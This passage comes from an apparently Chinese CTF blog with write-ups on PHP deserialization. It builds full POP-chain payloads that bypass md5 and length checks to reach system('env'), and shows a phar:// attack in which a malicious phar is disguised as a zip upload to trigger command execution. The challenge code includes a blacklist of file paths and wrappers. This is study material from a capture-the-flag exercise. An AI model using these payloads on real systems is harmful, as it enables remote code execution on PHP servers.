invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;boys和而不同&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123; <span class="comment">//绕过点</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>; <span class="comment">//partner为不存在的属性，触发__set</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boys堂堂正正&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再走一步...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>(); <span class="comment">//触发__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$args</span>[<span class="number">0</span>])&lt;<span class="number">4</span> &amp;&amp; (<span class="variable">$args</span>[<span class="number">0</span>]+<span class="number">1</span>)&gt;<span class="number">10000</span>)&#123; <span class="comment">//绕过点</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再走一步&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$args</span>[<span class="number">1</span>]; <span class="comment">//触发__toString</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你要努力进窄门&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">find_myself</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;24_SYC.zip&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有大家的压缩包的话，瓦达西！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是php特性和序列化，最终要实现触发<code>__invoke()</code>实现RCE，逆推可以得到利用链<code>__invoke()</code>&lt;-<code>__toString()</code>&lt;-<code>__call()</code>&lt;-<code>__set()</code>&lt;-<code>__destruct()</code></p><p>第一步是绕过md5检查，弱类型绕过的要求是0e后面为纯数字，当时查阅很多博客把字母参杂的也算了，但是不论放靶机还是本地都是过不了的，幸亏<a href="https://err0r233.github.io/posts/21053.html">@eEr0r233</a>前辈爆破出来了几个能用的，然后就是让<code>QYQS</code>触发<code>__set()</code>了，第一阶段的payload是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KiraKiraAyu=<span class="string">&#x27;aawBzC&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;K4per=<span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br></pre></td></tr></table></figure><p>双层md5加密后仍为0e加纯数字类型的值</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">aawBzC</span><br><span class="line">aabsbm9</span><br><span class="line">aaaabGG5T</span><br><span class="line">aaaabKGVH</span><br></pre></td></tr></table></figure><p>第二层的绕过点是<code>$fox</code>不是类<code>All_in_one</code>的一个实例，且当它被当函数调用时的返回值强等于<code>&quot;summer&quot;</code>，那只需要让<code>$fox</code>是<code>summer</code>类的实例就好了，至于如何让它返回<code>&quot;summer&quot;</code>，这里要用到静态调用来直接通过类名调用其静态方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;Fox=[<span class="string">&#x27;summer&#x27;</span>, <span class="string">&#x27;find_myself&#x27;</span>];</span><br></pre></td></tr></table></figure><p>第三层绕过点是<code>$args</code>的第1个元素字符长度小于4且该元素加一运算后大于<code>10000</code>，这里用科学计数法即可，<code>__call()</code>的返回值是一个数组，这里<code>$args[0]</code>就是<code>$this-&gt;L</code>，<code>$args[0]</code>就是<code>$this-&gt;sleep3r</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;komiko=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;L=<span class="string">&#x27;1e7&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br></pre></td></tr></table></figure><p>下一步就是触发<code>__invoke()</code>了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r-&gt;_4ak5ra=<span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br></pre></td></tr></table></figure><p>成功进入最后一层，这里我们试试用<code>env</code>能不能在环境变量里面找到flag，注意传递的参数名<code>24_SYC.zip</code>含有特殊字符，php会进行修改，这里要改成<code>24[SYC.zip</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r-&gt;_4ak5ra-&gt;Samsāra=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS-&gt;sleep3r-&gt;_4ak5ra-&gt;ivory=<span class="string">&#x27;env&#x27;</span>;</span><br></pre></td></tr></table></figure><p>把上面的步骤组合，序列化传入，可以看到是有的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;Round_And_r0und_019ab5d56b5f7445ac23a67b8736490e&#125;</span><br></pre></td></tr></table></figure><br /><br /><h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><p>有时候题目并没有<code>unserialize()</code>接口让payloiad进行反序列化，如果此时可以上传phar文件，搭配<code>phar://</code>伪协议可以帮助进行反序列化操作</p><h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中</p><p>phar主要由4部分组成</p><h4 id="stub-：phar文件标识"><a href="#stub-：phar文件标识" class="headerlink" title="stub ：phar文件标识"></a>stub ：phar文件标识</h4><p>格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件</p><h4 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h4><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方</p><h4 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h4><p>被压缩文件的内容</p><h4 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h4><p>签名，放在文件末尾</p><br /><h3 id="构建phar文件"><a href="#构建phar文件" class="headerlink" title="构建phar文件"></a>构建phar文件</h3><p>创建phar文件时要确保配置允许，在<code>php.ini</code>文件中将<code>phar.readonly</code>设置为<code>Off</code>，可以用以下代码创建一个phar文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//创建.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$B</span>);<span class="comment">//可以将序列化的内容写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;function.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件，内容为&quot;test&quot;</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br /><h4 id="极客大挑战2025-ez-seralize"><a href="#极客大挑战2025-ez-seralize" class="headerlink" title="[极客大挑战2025]ez-seralize"></a>[极客大挑战2025]ez-seralize</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">简单的读文件?</span><br></pre></td></tr></table></figure><p>dirsearch后可以看到uploads.php目录，进入是文件上传页，提示仅支持上传<code>txt, log, jpg, jpeg, png, zip</code>文件，回到主页面，可以直接输入<code>uploads.php</code>、<code>index.php</code>获取源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//uploads.php</span></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;gz&#x27;</span>];</span><br><span class="line"><span class="variable">$allowedMimes</span> = [</span><br><span class="line">    <span class="string">&#x27;txt&#x27;</span>  =&gt; [<span class="string">&#x27;text/plain&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span>  =&gt; [<span class="string">&#x27;text/plain&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;jpg&#x27;</span>  =&gt; [<span class="string">&#x27;image/jpeg&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;jpeg&#x27;</span> =&gt; [<span class="string">&#x27;image/jpeg&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;png&#x27;</span>  =&gt; [<span class="string">&#x27;image/png&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;zip&#x27;</span>  =&gt; [<span class="string">&#x27;application/zip&#x27;</span>, <span class="string">&#x27;application/x-zip-compressed&#x27;</span>, <span class="string">&#x27;multipart/x-zip&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;gif&#x27;</span>  =&gt; [<span class="string">&#x27;image/gif&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;gz&#x27;</span>   =&gt; [<span class="string">&#x27;application/gzip&#x27;</span>, <span class="string">&#x27;application/x-gzip&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$resultMessage</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$originalName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$originalName</span>, PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;File extension not allowed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$allowedMimes</span>[<span class="variable">$ext</span>]) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="variable">$allowedMimes</span>[<span class="variable">$ext</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;MIME type mismatch or not allowed. Detected: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$mime</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$safeBaseName</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^A-Za-z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$originalName</span>));</span><br><span class="line">        <span class="variable">$safeBaseName</span> = <span class="title function_ invoke__">ltrim</span>(<span class="variable">$safeBaseName</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$targetFilename</span> = <span class="title function_ invoke__">time</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$safeBaseName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/log.txt&#x27;</span>, <span class="string">&quot;upload file success: <span class="subst">$targetFilename</span>, MIME: <span class="subst">$mime</span>\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$targetPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$targetFilename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$targetPath</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chmod</span>(<span class="variable">$targetPath</span>, <span class="number">0644</span>);</span><br><span class="line">            <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;success&quot;&gt; File uploaded successfully &#x27;</span>. <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt; Failed to move uploaded file.&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$resultMessage</span> = <span class="string">&#x27;&lt;div class=&quot;error&quot;&gt; Upload error: &#x27;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现确实是白名单机制，会对后缀名和文件类型进行匹配，并且会对上传的文件进行重命名，并将上传记录写入<code>/tmp/log.txt</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="variable">$filename</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$balcklist</span> = [<span class="string">&quot;../&quot;</span>,<span class="string">&quot;%2e&quot;</span>,<span class="string">&quot;..&quot;</span>,<span class="string">&quot;data://&quot;</span>,<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;%0a&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;%0d&quot;</span>,<span class="string">&quot;php://&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/proc/self/environ&quot;</span>,<span class="string">&quot;php:file&quot;</span>,<span class="string">&quot;filter&quot;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$balcklist</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;no no no&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialized&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line">            <span class="variable">$file_contents</span>= <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_contents</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&quot;Failed to read seraizlie file or file does not exist: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="variable">$file_contents</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_contents</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$error</span> = <span class="string">&quot;Failed to read file or file does not exist: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="variable">$file_contents</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取的页面也有黑名单，主要是屏蔽了一些php伪协议，在这里还可以看到一个function.php文件，也可以直接查询源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//function.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;-</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce_me</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag/flag.txt &gt; /tmp/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个反序列化漏洞，利用链的逻辑是<code>__wakeup()</code>-&gt;<code>__toString</code>-&gt;<code>__invoke()</code>-&gt;<code>rce_me()</code>，可以很简单构造出payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//rce_me()&lt;-__invoke()&lt;-__toString()&lt;-__wakeup()</span></span><br><span class="line"><span class="variable">$B</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$B</span>-&gt;test=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$B</span>-&gt;test-&gt;luo=<span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$B</span>-&gt;test-&gt;luo-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br></pre></td></tr></table></figure><p>但是没有<code>unserialize()</code>进行反序列化操作，payload的用处就无从谈起，结合文件上传和无<code>unserialize()</code>的题目环境，这里应该是利用phar伪协议来进行反序列化操作，而且<code>index.php</code>没有过滤phar伪协议也印证了这一点，将我们的链打包成phar压缩包</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//创建.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$B</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;function.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//压缩文件随便放</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>利用文件上传的接口进行上传，这里要简单截包修改文件名和文件类型绕过白名单，这里文件名改成<code>phar.zip</code>，文件类型相应修改<code>application/zip</code></p><p>文件上传后会被重命名，不能直接依靠<code>phar.zip</code>访问，注意到<code>uploads.php</code>每次上传完成都会将修改后的文件名写入<code>log.txt</code>，尝试利用<code>index.php</code>获取<code>log.txt</code>的信息，确实可以看到上传后的文件名称</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">upload file success: 1763128085_phar.zip, MIME: application/zip</span><br></pre></td></tr></table></figure><p>尝试使用phar伪协议访问，我们为了反序列化还需要<code>index.php</code>包含<code>function.php</code>，这里需要额外带一个<code>serialized</code>参数</p><p>传参<code>?filename=phar://./uploads/1763128085_phar.zip/function.txt&amp;serialized=1</code></p><p>页面回显<code>Success!</code>，说明此时<code>function.php</code>里的<code>system(&quot;cat /flag/flag.txt &gt; /tmp/flag&quot;);</code>也同时执行了，回到题目首页查找文件<code>/tmp/flag</code>，即可获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;019a8289d2ce7e2facdfdcb68ea73edb&#125;</span><br></pre></td></tr></table></figure><br />]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup of PHPSerializelabs</title>
      <link href="/2025/11/23/Writeup-of-PHPSerializelabs/"/>
      <url>/2025/11/23/Writeup-of-PHPSerializelabs/</url>
      
